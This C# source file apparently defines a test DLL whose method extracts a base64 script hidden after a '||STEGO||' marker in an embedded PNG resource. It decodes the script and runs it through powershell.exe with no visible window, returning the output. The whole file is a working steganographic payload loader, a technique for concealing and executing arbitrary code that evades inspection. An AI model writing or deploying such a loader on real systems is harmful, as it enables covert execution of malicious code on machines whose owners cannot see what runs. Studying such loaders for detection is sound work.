using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace StegoTestDll
{
    public class StegoInvoker
    {
        public static string RevealAndExecute()
        {
            var assembly = Assembly.GetExecutingAssembly();
            // Namespace.Folder.File -> StegoTestDll.Resources.secret.png
            var resourceName = "StegoTestDll.Resources.secret.png";

            using (var stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream == null)
                {
                    var available = string.Join(", ", assembly.GetManifestResourceNames());
                    return $"Stack Trace: Resource '{resourceName}' not found. Available: {available}";
                }

                using (var ms = new MemoryStream())
                {
                    stream.CopyTo(ms);
                    var bytes = ms.ToArray();
                    
                    var separator = Encoding.UTF8.GetBytes("||STEGO||");
                    int index = IndexOf(bytes, separator);
                    
                    if (index == -1)
                        return "Error: Steganography Marker ||STEGO|| not found in Payload Image.";
                        
                    int payloadStart = index + separator.Length;
                    string base64Payload = Encoding.UTF8.GetString(bytes, payloadStart, bytes.Length - payloadStart);
                    
                    try 
                    {
                        byte[] scriptBytes = Convert.FromBase64String(base64Payload);
                        string script = Encoding.UTF8.GetString(scriptBytes);
                        
                        return RunPowerShell(script);
                    }
                    catch (Exception ex)
                    {
                        return $"Error Decoding Payload: {ex.Message}";
                    }
                }
            }
        }

        private static string RunPowerShell(string script)
        {
            try 
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -Command \"{script}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                
                    if (!string.IsNullOrEmpty(error))
                        return $"[PowerShell Output]\n{output}\n\n[PowerShell Error]\n{error}";
                    
                    return output;
                }
            }
            catch (Exception ex)
            {
                return $"Execution Error: {ex.Message}";
            }
        }

        private static int IndexOf(byte[] source, byte[] pattern)
        {
            for (int i = 0; i <= source.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (source[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }
    }
}
